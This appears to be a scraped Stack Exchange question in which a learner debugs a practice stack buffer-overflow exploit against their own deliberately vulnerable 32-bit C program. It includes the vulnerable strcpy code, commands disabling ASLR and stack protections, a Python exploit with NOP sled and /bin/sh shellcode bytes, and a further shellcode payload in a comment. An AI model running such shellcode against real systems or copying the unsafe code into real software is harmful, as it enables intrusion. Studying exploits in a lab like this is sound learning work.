@@ -1,0 +1,45 @@
+{
+  "title": "Illegal instruction fault in stack based buffer overflow",
+  "link": "https://reverseengineering.stackexchange.com/questions/21077/illegal-instruction-fault-in-stack-based-buffer-overflow",
+  "content": "I wrote this short C program to practice buffer overflow exploits:\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stddef.h>\n#include <inttypes.h>\n\nchar *decode(char *s){\n  for(int i = 0; i < strlen(s); i++){\n    s[i] ^= 0x15;\n  }\n  return s;\n}\n\nvoid get_secret(int argc, char *argv[]){\n\n  uint32_t eip_addr;\n  char secret[] = \"}aaef/::lz`a`;wp:qDb!b,BrMvD\";\n  char buffer[100];\n\n  if(argc > 1){\n    strcpy(buffer, argv[1]);\n  }else{\n    scanf(\"%s\", buffer);\n  }\n\n  printf(\"You entered: %s  \n  \n\", buffer);\n\n  if(strcmp(buffer, secret) == 0){\n    printf(\"Passwords match!  \n\");\n    printf(\"Here is the secret message: %s  \n\", decode(secret));\n  }else{\n    printf(\"Get the f!@# out of here!  \n\");\n    asm volatile(\"1: lea 1b, %0;\": \"=a\"(eip_addr));\n    printf(\"EIP address:  %\" PRIx32 \"; %\" PRIu32 \" bytes from main start  \n\",\n       eip_addr,eip_addr - (uint32_t)get_secret);\n  }\n}\nint main(int argc, char *argv[]){  \n  printf(\"Welcome to the simple verifier!  \n\");\n  printf(\"Please enter your password: \");\n\n  get_secret(argc, argv);\n\n  return 0;\n}\n\n```\nI disable ASLR and compile it with NX, PIE, and CANARY disabled:\n\n```\necho 0 > /proc/sys/kernel/randomize_va_space\ngcc -m32 -g -no-pie -fno-stack-protector -z execstack overflow.c -o overflow\n\n```\nUsing r2, ragg2 and rarun2, I find where I can overwrite the return address of get_secret():\n\n```\n~$ ragg2 -P 200 -r > pattern.txt\n~$ echo \"#!/usr/bin/rarun2\" > profile.rr2 && echo \"stdin=./pattern.txt\" >> profile.rr2\n~$ r2 -r profile.rr2 -d overflow\n[0xf7795a20]> dc\nEIP address:  804930b; 257 bytes from main start\nchild stopped with signal 11\n[+] SIGNAL 11 errno=0 addr=0x41784141 code=1 ret=0\n[0x41784141]> wopO 0x41784141\n145\n[0x41784141]> \n\n```\nSo, now I know exactly how big my payload must be to get to the return address, 145 bytes. Now I find an address to point to on the stack using gdb:\n\n```\n~$ gdb overflow_exe -q\ngdb-peda$ b 20\ngdb-peda$ b 25\ngdb-peda$ r $(python -c 'print \"A\"*145+\"B\"*4')\ngdb-peda$ c\ngdb-peda$ x/200x $esp\n0xffffd100: 0x39    0x25    0xfe    0xf7    0x00    0x00    0x00    0x00\n0xffffd108: 0x7d    0xc5    0xe5    0x41    0x41    0x41    0x41    0x41\n0xffffd110: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd118: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd120: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd128: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd130: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd138: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd140: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd148: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd150: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd158: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd160: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd168: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd170: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd178: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd180: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd188: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd190: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xffffd198: 0x41    0x41    0x41    0x41    0x42    0x42    0x42    0x42\n0xffffd1a0: 0x00    0x00    0x00    0x00    0x74    0xd2    0xff    0xff\n0xffffd1a8: 0x80    0x28    0xe2    0xf7    0x55    0x93    0x04    0x08\n0xffffd1b0: 0x02    0x00    0x00    0x00    0x74    0xd2    0xff    0xff\n0xffffd1b8: 0x80    0xd2    0xff    0xff    0xe0    0xd1    0xff    0xff\n0xffffd1c0: 0x00    0x00    0x00    0x00    0x02    0x00    0x00    0x00\ngdb-peda$\n\n```\nI should be able to replace those \\x41s with \\x90s, append my shellcode to it, then some address on the stack on to the end of that, making my payload look something like this:\n\n```\n\"\\x90\"*117 + </bin/sh shellcode> + <some address that's filled with \\x90>\n\n```\nUsing this logic, I picked an address in the middle on the NOPs, 0xffffd150, and crafted the following python exploit:\n\n```\n#!/usr/bin/env python\nimport struct, os\n\n#land in middle of NOPs\nret_addr = 0xffffd150\n\n#shellcode -> 28 bytes\nshell_code = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n\n#correct endianess\ndef conv(val):\n    return struct.pack('<I', val)\n\n# Build the exploit string\n# 149 bytes to overwrite the ret addr total\n# Need to take 28 bytes for the shellcode and 4 for the return addr\n# 145 - 28 = 117\nexp = \"\\x90\"*117\nexp += shell_code # at the ret addr (145 bytes) here\nexp += conv(ret_addr)\n\nprint(\"Starting exploit\")\nos.system(\"./overflow_exe \"+exp)\n\n```\nBut...I keep getting an Illegal instruction fault:\n\n```\n~$ ./overflow_exploit.py \nStarting exploit\nWelcome to the simple verifier!\nPlease enter your password: You entered: ���������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin�����°\n                 1�@̀P���\n\nGet the f!@# out of here!\nEIP address:  804930b; 257 bytes from main start\nIllegal instruction\n\n```\nBack in gdb I can see the NOP sled, shellcode, and return address, all where they should be:\n\n```\ngdb-peda$ x/200x $esp\n0xffffd120: 0xf7fe2539  0x00000000  0x90e5c57d  0x90909090\n0xffffd130: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd140: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd150: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd160: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd170: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd180: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd190: 0x90909090  0x90909090  0x90909090  0x90909090\n0xffffd1a0: 0x6850c031  0x68732f2f  0x69622f68  0x89e3896e\n0xffffd1b0: 0xb0c289c1  0x3180cd0b  0x80cd40c0  0xffffd150\n\n```\nI'm at a loss.  I re-check the binary's security features, and NX is still disabled (which is the only reason I can think of to explain the shellcode eliciting an \"Illegal instruction\" fault):\n\n```\ngdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : disabled\nPIE       : disabled\nRELRO     : Partial\ngdb-peda$ \n\n```\nWhy is my exploit throwing an Illegal instruction fault when all security features are disabled, and my shellcode is in the correct position on the stack?\n\nI'm on Debian 9\n\n",
+  "votes": "1",
+  "answers": 0,
+  "views": "841",
+  "tags": [
+    "radare2",
+    "c",
+    "gdb",
+    "python",
+    "buffer-overflow"
+  ],
+  "user": "corporateWhore",
+  "time": "Apr 15, 2019 at 0:24",
+  "comments": [
+    {
+      "user": "perror",
+      "text": "Try to step instruction by instruction through gdb with the si (stepi) command. You will get a more accurate information about what does cause the problem. Also, use layout next a few time until you get the assembly displayed.",
+      "time": null
+    },
+    {
+      "user": "sudhackar",
+      "text": "You can turn on core dumps and analyze where your return address lands. Stack addresses are not same when you run a binary under gdb and without it.",
+      "time": null
+    },
+    {
+      "user": "corporateWhore",
+      "text": "Following stackoverflow.com/a/17775966/4678883 managed to get the correct stack address (which was in fact different).  My shellcode executes but for some reason instead of spawning a shell, it interprets the remaining stack contents as a shell command. So if this is my argument:  $(python -c 'print \"\\x90\"*65 + \"\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\"+\"A\"*50+\"\\x50\\xdc\\xff\\xff\"'), I get sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���: not found",
+      "time": null
+    },
+    {
+      "user": "Caroline",
+      "text": "What architecture are you running on ? Is it x86 or x86_64 ?  If your running your shellcode on an x86_64 processor, the first instruction are : XOR        EAX, EAX PUSH       RAX instead of (on x86_32) XOR        EAX, EAX PUSH       EAX",
+      "time": null
+    },
+    {
+      "user": "corporateWhore",
+      "text": "I'm running X86_64 but the program was compiled as X86.",
+      "time": null
+    }
+  ],
+  "answers_data": []
+}
